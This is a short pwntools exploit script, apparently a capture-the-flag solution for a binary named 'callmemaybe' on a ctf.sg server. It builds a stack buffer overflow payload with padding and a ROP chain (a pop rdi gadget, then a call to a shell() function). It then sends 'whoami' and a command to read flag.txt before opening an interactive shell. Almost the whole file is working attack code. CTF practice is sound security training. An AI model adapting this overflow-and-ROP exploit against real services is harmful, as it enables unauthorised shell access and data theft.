
from pwn import *

# You can use netcat to interact with the service manually too:
# nc <HOST> <PORT>

HOST = '3qo9k5hk5cprtqvnlkvotlnj9d14b7mt.ctf.sg'
PORT = 30201


#if True:
if True:
    io = remote(HOST, PORT)  # Comment this out when testing locally
else:
    io = process("Given/callmemaybe")

### Payload #########################################################
contact = b"A"*64 # Padding for the variable contact
padding = b"A"*8 # Bruteforce the requred extra padding before it doesn't crash
#padding = p64(0xDEADBEEF)
#payload += b"A"*16

## ROP Gadgets
ropchain = b""
#ropchain += p64(0x000000000040055e) # Does nothing except ret lmao
ropchain += p64(0x0000000000400873) #pop rdi; ret
ropchain += p64(0xDEADBEEF)
ropchain += p64(0x00000000004006ea) # shell()
#ropchain += p64(0x7ffff7e21120)# system command


payload = contact + padding + ropchain

#####################################################################
#with open("inputfile.txt", "wb") as f: f.write(payload)

print(len(payload))
print(payload)
io.send(payload+b"\n")

#print("### Shell ######################")
io.send("whoami\n")
io.send("cat /home/callmemaybe/flag.txt\n")
io.interactive()
#io.close()
